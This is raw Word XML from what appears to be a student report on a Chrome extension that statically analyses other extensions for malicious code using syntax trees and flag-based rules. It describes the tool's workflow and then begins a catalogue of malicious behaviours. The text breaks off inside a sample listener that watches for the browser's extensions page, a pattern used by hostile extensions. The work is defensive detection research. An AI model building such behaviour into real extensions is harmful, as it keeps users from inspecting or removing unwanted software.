          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>We use this technique to send the extension ID that the user chose to the native application which will download the source code and run the static analysis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04781A2F" w14:textId="77777777" w:rsidR="009E56F2" w:rsidRPr="006C7A53" w:rsidRDefault="009E56F2" w:rsidP="00B45673">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E91344D" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="006C7A53">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="141" w:name="_Toc523071510"/>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Parsers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="141"/>
    </w:p>
    <w:p w14:paraId="73901C6D" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00B45673">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>As we know, extensions support JavaScript and HTML. Malicious code can be found in both, therefore we used two parsers, one for each type. We use the Abstract Syntax Tree as a representation of the abstract syntactic structure of the source code written in each file of the extension.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9F731C" w14:textId="77777777" w:rsidR="009E56F2" w:rsidRPr="006C7A53" w:rsidRDefault="009E56F2" w:rsidP="00B45673">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52100091" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="006C7A53">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="142" w:name="_Toc523071511"/>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rules</w:t>
      </w:r>
      <w:bookmarkEnd w:id="142"/>
    </w:p>
    <w:p w14:paraId="4AF29D35" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRPr="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00501421">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Now that we have the Abstract Syntax Tree</w:t>
      </w:r>
      <w:del w:id="143" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
        <w:r w:rsidRPr="006C7A53" w:rsidDel="00D05080">
          <w:rPr>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:delText xml:space="preserve"> (AST)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>, we can start adding rules. As rule we describe a set of elements, such as call expressions, variables, keywords etc., that indicate suspicious activity when found in the source code</w:t>
      </w:r>
      <w:r w:rsidR="0086229A">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> in a specific combination and order</w:t>
      </w:r>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5885CE9F" w14:textId="77777777" w:rsidR="00BB3A9E" w:rsidRDefault="00573490" w:rsidP="00C60BA6">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="006C7A53" w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>o define a rule, we use lists and flags.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C60BA6">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">We use the lists to gather all the elements that could lead </w:t>
      </w:r>
      <w:r w:rsidR="00710704">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="00C60BA6">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">s to a suspicious action and when we find a </w:t>
      </w:r>
      <w:r w:rsidR="00710704">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">specific </w:t>
      </w:r>
      <w:r w:rsidR="00C60BA6">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">combination </w:t>
      </w:r>
      <w:r w:rsidR="00710704">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">we mark it with a flag. Finally, we have set groups of flags that when they are all active, </w:t>
      </w:r>
      <w:r w:rsidR="00C60BA6">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>indicate a suspicious activity</w:t>
      </w:r>
      <w:r w:rsidR="00710704">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205497D5" w14:textId="77777777" w:rsidR="00BB3A9E" w:rsidRDefault="00BB3A9E" w:rsidP="00BB3A9E">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="685199B2" w14:textId="77777777" w:rsidR="0065719B" w:rsidRPr="0065719B" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="144" w:name="_Toc523071512"/>
      <w:r w:rsidRPr="00F10931">
        <w:lastRenderedPageBreak/>
        <w:t>Running the extension</w:t>
      </w:r>
      <w:bookmarkEnd w:id="144"/>
    </w:p>
    <w:p w14:paraId="1D824145" w14:textId="77777777" w:rsidR="00F10931" w:rsidRPr="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F10931">
        <w:t>In this section we show a brief presentation of how our extensions looks like while we run it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290EB45B" w14:textId="5336B792" w:rsidR="00F10931" w:rsidRPr="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F10931">
        <w:t>First</w:t>
      </w:r>
      <w:del w:id="145" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
        <w:r w:rsidRPr="00F10931" w:rsidDel="009167E9">
          <w:delText xml:space="preserve"> of all</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00F10931">
        <w:t xml:space="preserve">, we have to select an extension from the Chrome webstore for which we are going to run the analysis. Then, we can run our extension by clicking the icon. A popup will come out which has a “Connect” button as shown in Figure 3. When we press the button, a connection with the native messaging host will be created and a blank window will open. After that, the popup will have a “Run” button (Figure 4) which will trigger the </w:t>
      </w:r>
      <w:r w:rsidR="0019558C">
        <w:t xml:space="preserve">(native) </w:t>
      </w:r>
      <w:r w:rsidRPr="00F10931">
        <w:t>application by sending the URL of the current tab and the analysis will start (Figure 5). The window opened earlier will inform us about the results of the analysis (Figure 6).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3429DB0E" w14:textId="77777777" w:rsidR="00F10931" w:rsidRPr="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:r w:rsidRPr="00F10931">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C57350" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="008D36E5">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="036C7C0D" wp14:editId="32D0711E">
            <wp:extent cx="2667000" cy="2800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2800350"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E5ABFC" w14:textId="2CB4C880" w:rsidR="00F10931" w:rsidRPr="00F10931" w:rsidRDefault="00F10931" w:rsidP="008D36E5">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="146" w:name="_Toc523071575"/>
      <w:r w:rsidRPr="00F10931">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F10931">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: Connecting to native messaging host.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="146"/>
    </w:p>
    <w:p w14:paraId="3703E047" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="008D36E5">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6811BCB5" wp14:editId="01906A63">
            <wp:extent cx="2647950" cy="2790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7950" cy="2790825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABFD5B1" w14:textId="21E4E1DD" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="008D36E5">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="147" w:name="_Toc523071576"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: Running the analysis.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="147"/>
    </w:p>
    <w:p w14:paraId="1C75AF3C" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="79DBE3F0" wp14:editId="1C4E0D51">
            <wp:extent cx="2628900" cy="2809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8900" cy="2809875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D052A8" w14:textId="51600767" w:rsidR="00F10931" w:rsidRPr="008D36E5" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="148" w:name="_Toc523071577"/>
      <w:r w:rsidRPr="008D36E5">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="008D36E5">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: Running the analysis (after clicking).</w:t>
      </w:r>
      <w:bookmarkEnd w:id="148"/>
    </w:p>
    <w:p w14:paraId="77FFEA45" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2210C0F9" wp14:editId="79619C7D">
            <wp:extent cx="6486525" cy="1933575"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="11" name="Picture 11" descr="C:\Users\ilias\Desktop\asd\report\imgs\resu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lias\Desktop\asd\report\imgs\result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6525" cy="1933575"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCB40D8" w14:textId="3B90A908" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="149" w:name="_Toc523071578"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: Window with results.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="149"/>
    </w:p>
    <w:p w14:paraId="238367FA" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03389C91" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DDB29BD" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BDD00F1" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="787A00C1" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B7BD8D5" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="593A52CC" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D8739D9" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37C2F63A" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D6CD1FB" w14:textId="77777777" w:rsidR="00F10931" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62C06BE3" w14:textId="77777777" w:rsidR="00F10931" w:rsidRPr="00BB3A9E" w:rsidRDefault="00F10931" w:rsidP="00F10931">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AF7DE47" w14:textId="2F90E7D8" w:rsidR="00BB3A9E" w:rsidRDefault="00BB3A9E" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="150" w:name="_Toc523071513"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>IMPLEMENTA</w:t>
      </w:r>
      <w:r w:rsidR="007070C3">
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ION</w:t>
      </w:r>
      <w:r w:rsidR="00A67839">
        <w:t xml:space="preserve"> DETAILS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="150"/>
    </w:p>
    <w:p w14:paraId="651B1A04" w14:textId="4BC9FAC2" w:rsidR="00F46002" w:rsidDel="004C2E4E" w:rsidRDefault="00924627" w:rsidP="00924627">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="151" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>In this section</w:t>
      </w:r>
      <w:ins w:id="152" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
        <w:r w:rsidR="00A35CAB">
          <w:rPr>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> we present 10 cases of malicious behavior that we chose to use in order to create our rules. We explain </w:t>
      </w:r>
      <w:r w:rsidR="00943368">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>how they work and why we consider they as suspicious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336D37C4" w14:textId="77777777" w:rsidR="007D1EA1" w:rsidRPr="00943368" w:rsidRDefault="007D1EA1" w:rsidP="00924627">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="153" w:name="_Toc523071514"/>
    <w:p w14:paraId="2552C502" w14:textId="41098105" w:rsidR="009E02A4" w:rsidRDefault="00B8142A" w:rsidP="00B8142A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251637760" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="17552D20" wp14:editId="56960A6B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>13335</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>559435</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5915025" cy="1638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638300"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="687D857D" w14:textId="717D1DDE" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="00B8142A">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>chrome.tabs.onUpdated.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>addListener</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(tabid</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>x</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>tab){</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>if</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">(tab.url == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">'chrome://chrome/extensions' </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>||</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   tab.url == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">'opera://extensions' </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>||</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   tab.url == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>'chrome://extensions/'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      chrome.tabs.</w:t>
                            </w:r>
